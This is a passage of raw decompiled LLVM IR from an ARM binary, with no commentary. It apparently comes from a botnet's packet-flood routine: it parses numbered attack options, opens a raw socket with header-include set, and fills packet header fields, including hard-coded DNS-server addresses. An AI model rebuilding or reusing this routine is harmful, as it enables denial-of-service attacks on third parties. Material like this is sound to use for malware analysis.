  br i1 %v9_a9c8, label %dec_label_pc_aab8, label %dec_label_pc_a9d0

dec_label_pc_a9d0:                                ; preds = %dec_label_pc_aaa4, %dec_label_pc_a9c4, %dec_label_pc_aab8
  %v0_a9d0 = load i32, i32* @r4, align 4
  %v1_a9d0 = add i32 %v0_a9d0, 41
  store i32 %v1_a9d0, i32* %r0.global-to-local, align 4
  store i32 %v4_a9d4.pre-phi, i32* %r1.global-to-local, align 4
  %v2_a9d8 = call i32 @function_e194(i32 %v1_a9d0, i32 %v4_a9d4.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9e0 = load i32, i32* @r4, align 4
  %v3_a9e0 = add i32 %v2_a9e0, 10
  %v4_a9e0 = inttoptr i32 %v3_a9e0 to i16*
  store i16 0, i16* %v4_a9e0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a9e8 = load i32, i32* @r4, align 4
  store i32 %v0_a9e8, i32* @r0, align 4
  %v2_a9ec = call i32 @function_c848(i32 %v0_a9e8, i32 20)
  %v3_a9ec = trunc i32 %v2_a9ec to i16
  store i32 %v2_a9ec, i32* %r0.global-to-local, align 4
  %v3_a9f0 = load i32, i32* @r4, align 4
  %v4_a9f0 = add i32 %v3_a9f0, 10
  %v5_a9f0 = inttoptr i32 %v4_a9f0 to i16*
  store i16 %v3_a9ec, i16* %v5_a9f0, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a9f8 = load i32, i32* @r6, align 4
  %v3_a9f8 = add i32 %v2_a9f8, 6
  %v4_a9f8 = inttoptr i32 %v3_a9f8 to i16*
  store i16 0, i16* %v4_a9f8, align 2
  %v0_a9fc = load i32, i32* @r6, align 4
  store i32 %v0_a9fc, i32* @r1, align 4
  %v1_aa00 = add i32 %v0_a9fc, 4
  %v2_aa00 = inttoptr i32 %v1_aa00 to i16*
  %v3_aa00 = load i16, i16* %v2_aa00, align 2
  %v4_aa00 = zext i16 %v3_aa00 to i32
  store i32 %v4_aa00, i32* %r2.global-to-local, align 4
  %v0_aa04 = load i32, i32* @sb, align 4
  store i32 %v0_aa04, i32* %r3.global-to-local, align 4
  %v0_aa08 = load i32, i32* @r4, align 4
  store i32 %v0_aa08, i32* %r0.global-to-local, align 4
  %v4_aa0c = call i32 @function_c898(i32 %v0_aa08, i32 %v0_a9fc, i32 %v4_aa00, i32 %v0_aa04)
  %v5_aa0c = trunc i32 %v4_aa0c to i16
  store i32 %v4_aa0c, i32* %r0.global-to-local, align 4
  %v3_aa10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa10, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa18 = mul i32 %v3_aa10, 32
  store i32 %v3_aa18, i32* %ip.global-to-local, align 4
  %v3_aa1c = load i32, i32* @r6, align 4
  %v4_aa1c = add i32 %v3_aa1c, 6
  %v5_aa1c = inttoptr i32 %v4_aa1c to i16*
  store i16 %v5_aa0c, i16* %v5_aa1c, align 2
  %v0_aa20 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa20 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa20, -8
  %v5_aa20 = add i32 %v0_aa20, %tmp128
  store i32 %v5_aa20, i32* %ip.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r6, align 4
  %v1_aa24 = add i32 %v0_aa24, 2
  %v2_aa24 = inttoptr i32 %v1_aa24 to i16*
  %v3_aa24 = load i16, i16* %v2_aa24, align 2
  %v1_aa28 = load i32, i32* @lr, align 4
  %v2_aa28 = add i32 %v1_aa28, %v5_aa20
  store i32 %v2_aa28, i32* %ip.global-to-local, align 4
  %v3_aa2c = add i32 %v2_aa28, 2
  %v4_aa2c = inttoptr i32 %v3_aa2c to i16*
  store i16 %v3_aa24, i16* %v4_aa2c, align 2
  %v0_aa30 = load i32, i32* @fp, align 4
  %v1_aa30 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa30 = add i32 %v1_aa30, 4
  %v3_aa30 = inttoptr i32 %v2_aa30 to i32*
  store i32 %v0_aa30, i32* %v3_aa30, align 4
  %v0_aa34 = load i32, i32* @r4, align 4
  store i32 %v0_aa34, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v0_aa40 = load i32, i32* @sl, align 4
  store i32 %v0_aa40, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa48 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa50 = call i32 @function_11a68(i32 %v3_a6e8, i32 %v0_aa34, i32 %v0_aa40, i32 16384, i32 %v0_aa48, i32 16)
  %v3_aa54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa54, i32* %r3.global-to-local, align 4
  %v1_aa58 = add i32 %v3_aa54, 1
  store i32 %v1_aa58, i32* %r0.global-to-local, align 4
  %v0_aa5c = load i32, i32* @r8, align 4
  %v9_aa5c = icmp eq i32 %v0_aa5c, %v1_aa58
  store i1 %v9_aa5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa58, i32* %stack_var_-44, align 4
  %v8_aa64 = icmp sgt i32 %v0_aa5c, %v1_aa58
  br i1 %v8_aa64, label %dec_label_pc_a98c, label %dec_label_pc_aa68

dec_label_pc_aa68:                                ; preds = %dec_label_pc_a9d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa6c = icmp eq i32 %v0_aa5c, 0
  store i1 %v2_aa6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aa6c, label %dec_label_pc_a970, label %dec_label_pc_a980

dec_label_pc_aa7c:                                ; preds = %dec_label_pc_a98c
  %v0_aa7c = call i32 @function_e0d0()
  %v1_aa7c = trunc i32 %v0_aa7c to i16
  store i32 %v0_aa7c, i32* %r0.global-to-local, align 4
  store i32 %v3_a74c, i32* @lr, align 4
  %v1_aa84 = load i32, i32* @r5, align 4
  %v9_aa84 = icmp eq i32 %v3_a74c, %v1_aa84
  store i1 %v9_aa84, i1* %cpsr_z.global-to-local, align 1
  %v3_aa88 = load i32, i32* @r4, align 4
  %v4_aa88 = add i32 %v3_aa88, 4
  %v5_aa88 = inttoptr i32 %v4_aa88 to i16*
  store i16 %v1_aa7c, i16* %v5_aa88, align 2
  br i1 %v9_aa84, label %dec_label_pc_aa90, label %dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge

dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge:    ; preds = %dec_label_pc_aa7c
  %v1_a9bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9b8

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa7c, %dec_label_pc_a9ac
  %v0_aa90 = call i32 @function_e0d0()
  %v1_aa90 = trunc i32 %v0_aa90 to i16
  %v3_aa94 = load i32, i32* @r4, align 4
  %v4_aa94 = add i32 %v3_aa94, 20
  %v5_aa94 = inttoptr i32 %v4_aa94 to i16*
  store i16 %v1_aa90, i16* %v5_aa94, align 2
  store i32 %v3_a768, i32* %r0.global-to-local, align 4
  %v1_aa9c = load i32, i32* @r5, align 4
  %v9_aa9c = icmp eq i32 %v3_a768, %v1_aa9c
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa9c, label %dec_label_pc_aaa4, label %dec_label_pc_a9c4

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_aa90, %dec_label_pc_a9b8
  %v0_aaa4 = call i32 @function_e0d0()
  %v1_aaa4 = trunc i32 %v0_aaa4 to i16
  store i32 %v0_aaa4, i32* %r0.global-to-local, align 4
  store i32 %v3_a770, i32* %r2.global-to-local, align 4
  %v1_aaac = load i32, i32* @r5, align 4
  %v9_aaac = icmp eq i32 %v3_a770, %v1_aaac
  store i1 %v9_aaac, i1* %cpsr_z.global-to-local, align 1
  %v3_aab0 = load i32, i32* @r6, align 4
  %v4_aab0 = add i32 %v3_aab0, 2
  %v5_aab0 = inttoptr i32 %v4_aab0 to i16*
  store i16 %v1_aaa4, i16* %v5_aab0, align 2
  br i1 %v9_aaac, label %dec_label_pc_aab8, label %dec_label_pc_a9d0

dec_label_pc_aab8:                                ; preds = %dec_label_pc_aaa4, %dec_label_pc_a9c4
  %v0_aab8 = call i32 @function_e0d0()
  %v1_aab8 = trunc i32 %v0_aab8 to i16
  store i32 %v0_aab8, i32* %r0.global-to-local, align 4
  %v3_aabc = load i32, i32* @r4, align 4
  %v4_aabc = add i32 %v3_aabc, 28
  %v5_aabc = inttoptr i32 %v4_aabc to i16*
  store i16 %v1_aab8, i16* %v5_aabc, align 2
  br label %dec_label_pc_a9d0

dec_label_pc_aac4:                                ; preds = %dec_label_pc_a650, %dec_label_pc_a630, %dec_label_pc_a5d4, %dec_label_pc_a480
  %v0_aac4 = call i32 @function_e0d0()
  %v1_aac8 = urem i32 %v0_aac4, 4
  store i32 %v1_aac8, i32* %r0.global-to-local, align 4
  %v2_aacc = icmp eq i32 %v1_aac8, 3
  store i1 %v2_aacc, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_aac4 to i2
  switch i2 %trunc, label %dec_label_pc_a6c811 [
    i2 0, label %dec_label_pc_ab00
    i2 1, label %dec_label_pc_ab2c
    i2 -2, label %dec_label_pc_ab20
    i2 -1, label %dec_label_pc_ab10
  ]

dec_label_pc_aae8:                                ; preds = %dec_label_pc_a6f8
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v1_aaec = call i32 @function_1130c(i32 %v3_a6e8)
  store i32 %v1_aaec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aaf0

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_a6d0, %dec_label_pc_a6c8, %dec_label_pc_aae8
  %v1_aafc = phi i32 [ %v3_a6e8, %dec_label_pc_a6d0 ], [ %v1_aafc49, %dec_label_pc_a6c8 ], [ %v1_aaec, %dec_label_pc_aae8 ]
  store i32 %v18_a480, i32* %sb.global-to-local, align 4
  store i32 %v27_a480, i32* %lr.global-to-local, align 4
  ret i32 %v1_aafc

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aac4
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_ab10:                                ; preds = %dec_label_pc_aac4
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_ab20:                                ; preds = %dec_label_pc_aac4
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_ab2c:                                ; preds = %dec_label_pc_aac4
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a6c8

; uselistorder directives
  uselistorder i32 %v1_aac8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_aac4, { 1, 0 }
  uselistorder i32 %v0_aab8, { 1, 0 }
  uselistorder i32 %v0_aaa4, { 1, 0 }
  uselistorder i32 %v1_aa9c, { 1, 0 }
  uselistorder i32 %v0_aa7c, { 1, 0 }
  uselistorder i32 %v1_aa58, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa20, { 1, 0 }
  uselistorder i32 %v4_aa0c, { 1, 0 }
  uselistorder i32 %v2_a9ec, { 1, 0 }
  uselistorder i1 %v3_a9b0, { 1, 0 }
  uselistorder i1 %v3_a9a0, { 1, 0 }
  uselistorder i32 %v4_a9d4.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a948, { 1, 0, 2 }
  uselistorder i32 %v0_a938, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a924, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a920, { 1, 0, 2 }
  uselistorder i32 %v0_a890, { 1, 0 }
  uselistorder i32 %v4_a88c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a7d8, { 1, 0 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v1_a788, { 2, 0, 1 }
  uselistorder i32 %v3_a754, { 1, 0 }
  uselistorder i32 %v3_a74c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a744, { 0, 2, 1 }
  uselistorder i8 %v5_a73c, { 1, 0, 2 }
  uselistorder i32 %v1_a728, { 1, 0 }
  uselistorder i32 %v0_a728, { 1, 0 }
  uselistorder i1 %v7_a718, { 1, 0 }
  uselistorder i1 %v7_a6ec, { 1, 0 }
  uselistorder i32 %v3_a6e8, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a6c8, { 1, 0, 2 }
  uselistorder i32 %v2_a698, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a694, { 1, 0, 2 }
  uselistorder i1 %v7_a684, { 1, 0 }
  uselistorder i32 %v1_a680, { 1, 0, 2 }
  uselistorder i1 %v8_a678, { 1, 0 }
  uselistorder i1 %v7_a674, { 1, 0 }
  uselistorder i32 %v1_a668, { 1, 0 }
  uselistorder i8 %v2_a65c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a660, { 1, 0 }
  uselistorder i32 %v0_a680, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a650, { 0, 2, 1 }
  uselistorder i32 %v1_a664, { 0, 2, 1 }
  uselistorder i32 %v2_a638, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a630, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a628, { 1, 0 }
  uselistorder i32 %v0_a628, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a5cc, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a56c, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a550, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a538, { 2, 1, 0 }
  uselistorder i32 %v1_a520, { 1, 0 }
  uselistorder i32 %v7_a4dc, { 1, 0, 2 }
  uselistorder i32 %v2_a4a0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 37, 36, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 6, 8, 7, 10, 9, 11, 13, 12, 14, 15, 16, 18, 17, 21, 19, 20, 22, 23, 28, 24, 25, 26, 27, 32, 29, 30, 31, 33, 35, 34, 36, 2, 37, 38, 40, 39, 41, 42, 44, 43, 45, 1, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aaf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %dec_label_pc_a970, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a970.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a940, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 1, 0 }
  uselistorder label %dec_label_pc_a684, { 1, 0 }
  uselistorder label %dec_label_pc_a650, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a648, { 1, 0 }
}

define i32 @function_ab3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ab3c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab3c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab58 = call i32 @function_12654(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_ab64 = load i32, i32* @r6, align 4
  store i32 %v0_ab64, i32* %r0.global-to-local, align 4
  %v2_ab68 = call i32 @function_12654(i32 %v0_ab64, i32 4)
  %v0_ab6c = load i32, i32* @r5, align 4
  store i32 %v0_ab6c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ab7c = load i32, i32* @r4, align 4
  store i32 %v0_ab7c, i32* %r0.global-to-local, align 4
  %v5_ab80 = inttoptr i32 %v0_ab6c to i32*
  %v6_ab80 = call i32 @function_8570(i32 %v0_ab7c, i32* %v5_ab80, i32 2, i32 0)
  %v1_ab8c = urem i32 %v6_ab80, 256
  store i32 %v1_ab8c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ab98 = load i32, i32* @r5, align 4
  store i32 %v0_ab98, i32* %r1.global-to-local, align 4
  %v0_ab9c = load i32, i32* @r4, align 4
  store i32 %v0_ab9c, i32* %r0.global-to-local, align 4
  %v5_aba0 = trunc i32 %v6_ab80 to i8
  %v6_aba4 = inttoptr i32 %v0_ab98 to i32*
  %v7_aba4 = call i32 @function_8570(i32 %v0_ab9c, i32* %v6_aba4, i32 3, i32 65535)
  %v0_aba8 = load i32, i32* @r5, align 4
  store i32 %v0_aba8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_aba4, i32* @r7, align 4
  %v0_abb8 = load i32, i32* @r4, align 4
  store i32 %v0_abb8, i32* %r0.global-to-local, align 4
  %v4_abbc = inttoptr i32 %v0_aba8 to i32*
  %v5_abbc = call i32 @function_8570(i32 %v0_abb8, i32* %v4_abbc, i32 4, i32 64)
  %v1_abc4 = urem i32 %v5_abbc, 256
  store i32 %v1_abc4, i32* %ip.global-to-local, align 4
  %v0_abc8 = load i32, i32* @r5, align 4
  store i32 %v0_abc8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_abd4 = load i32, i32* @r4, align 4
  store i32 %v0_abd4, i32* %r0.global-to-local, align 4
  %v6_abdc = inttoptr i32 %v0_abc8 to i32*
  %v7_abdc = call i32 @function_8570(i32 %v0_abd4, i32* %v6_abdc, i32 5, i32 1)
  %v1_abe8 = urem i32 %v7_abdc, 256
  store i32 %v1_abe8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_abf0 = load i32, i32* @r5, align 4
  store i32 %v0_abf0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v5_ac00 = inttoptr i32 %v0_abf0 to i32*
  %v6_ac00 = call i32 @function_8570(i32 %v0_abf8, i32* %v5_ac00, i32 7, i32 65535)
  %v0_ac04 = load i32, i32* @r5, align 4
  store i32 %v0_ac04, i32* %r1.global-to-local, align 4
  %v3_ac08 = mul i32 %v6_ac00, 65536
  store i32 %v3_ac08, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v3_ac18 = urem i32 %v6_ac00, 65536
  store i32 %v3_ac18, i32* @sl, align 4
  %v4_ac1c = inttoptr i32 %v0_ac04 to i32*
  %v5_ac1c = call i32 @function_8570(i32 %v0_ac14, i32* %v4_ac1c, i32 11, i32 1)
  %v1_ac24 = urem i32 %v5_ac1c, 256
  store i32 %v1_ac24, i32* %ip.global-to-local, align 4
  %v0_ac28 = load i32, i32* @r5, align 4
  store i32 %v0_ac28, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac34 = load i32, i32* @r4, align 4
  store i32 %v0_ac34, i32* %r0.global-to-local, align 4
  %v5_ac3c = inttoptr i32 %v0_ac28 to i32*
  %v6_ac3c = call i32 @function_8570(i32 %v0_ac34, i32* %v5_ac3c, i32 12, i32 1)
  %v1_ac44 = urem i32 %v6_ac3c, 256
  store i32 %v1_ac44, i32* %ip.global-to-local, align 4
  %v0_ac48 = load i32, i32* @r5, align 4
  store i32 %v0_ac48, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v5_ac5c = inttoptr i32 %v0_ac48 to i32*
  %v6_ac5c = call i32 @function_8570(i32 %v0_ac54, i32* %v5_ac5c, i32 13, i32 1)
  %v1_ac64 = urem i32 %v6_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @function_8570(i32 %v0_ac74, i32* %v5_ac7c, i32 14, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @function_8570(i32 %v0_ac94, i32* %v5_ac9c, i32 15, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @function_8570(i32 %v0_acb4, i32* %v5_acbc, i32 16, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_acd0 = load i32, i32* @r5, align 4
  store i32 %v0_acd0, i32* %r1.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acd0 to i32*
  %v6_acdc = call i32 @function_8570(i32 %v0_acd4, i32* %v5_acdc, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acec = load i32, i32* @r5, align 4
  store i32 %v0_acec, i32* %r1.global-to-local, align 4
  %v0_acf0 = load i32, i32* @r4, align 4
  store i32 %v0_acf0, i32* %r0.global-to-local, align 4
  %v4_acf4 = inttoptr i32 %v0_acec to i32*
  %v5_acf4 = call i32 @function_8570(i32 %v0_acf0, i32* %v4_acf4, i32 1, i32 1)
  %v1_acfc = urem i32 %v5_acf4, 256
  store i32 %v1_acfc, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad10 = call i32 @function_11aec(i32 2, i32 3, i32 6)
  store i32 %v3_ad10, i32* %r0.global-to-local, align 4
  %v7_ad14 = icmp eq i32 %v3_ad10, -1
  store i1 %v7_ad14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad10, i32* @sb, align 4
  br i1 %v7_ad14, label %dec_label_pc_af04, label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ab3c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad28 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad28, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad3c = call i32 @function_11aa8(i32 %v3_ad10, i32 0, i32 3, i32 %v6_ad28, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad3c, i32* %r0.global-to-local, align 4
  %v7_ad40 = icmp eq i32 %v5_ad3c, -1
  store i1 %v7_ad40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad40, label %dec_label_pc_aefc, label %dec_label_pc_ad48

dec_label_pc_ad48:                                ; preds = %dec_label_pc_ad20
  %v0_ad48 = load i32, i32* @r7, align 4
  %v3_ad48 = mul i32 %v0_ad48, 65536
  store i32 %v3_ad48, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad50 = load i32, i32* @r6, align 4
  %v2_ad50 = icmp eq i32 %v0_ad50, 0
  store i1 %v2_ad50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad58 = urem i32 %v0_ad48, 65536
  store i32 %v3_ad58, i32* @fp, align 4
  br i1 %v2_ad50, label %dec_label_pc_b188, label %dec_label_pc_ad60.preheader

dec_label_pc_ad60.preheader:                      ; preds = %dec_label_pc_ad48
  %v2_adac = ptrtoint i32* %stack_var_-144 to i32
  %v2_adf0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae28 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae34 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae38 = ptrtoint i32* %stack_var_-48 to i32
  %v4_ae98 = zext i8 %tmp to i32
  %v1_ae9c = and i32 %v4_ae98, 18
  %v2_aea0 = icmp eq i32 %v1_ae9c, 18
  %v4_b044 = sext i8 %v5_aba0 to i32
  %sext = mul i32 %v5_abbc, 16777216
  %v4_b054 = sdiv i32 %sext, 16777216
  %v3_ae84 = sext i16 %tmp61 to i32
  %v1_aea8 = and i32 %v4_ae98, 5
  %v2_aea8 = icmp eq i32 %v1_aea8, 0
  %v4_ade8 = add i32 %v2_adac, 82
  %v5_ade8 = inttoptr i32 %v4_ade8 to i16*
  %v1_afd8 = add i32 %v6_acdc, 40
  %v1_b0ec = urem i32 %v5_ac1c, 2
  %tmp97 = sub nsw i32 0, %v1_b0ec
  %v4_b0f4 = and i32 %tmp97, 32
  %v1_b104 = urem i32 %v6_ac3c, 2
  %tmp98 = sub nsw i32 0, %v1_b104
  %v4_b10c = and i32 %tmp98, 16
  %v1_b11c = urem i32 %v6_ac5c, 2
  %tmp99 = sub nsw i32 0, %v1_b11c
  %v4_b124 = and i32 %tmp99, 8
  %v1_b134 = urem i32 %v6_ac7c, 2
  %tmp100 = sub nsw i32 0, %v1_b134
  %v4_b13c = and i32 %tmp100, 4
  %v1_b14c = urem i32 %v6_ac9c, 2
  %tmp101 = sub nsw i32 0, %v1_b14c
  %v3_b154 = and i32 %tmp101, 2
  %v1_b164 = urem i32 %v6_acbc, 2
  br label %dec_label_pc_ad60

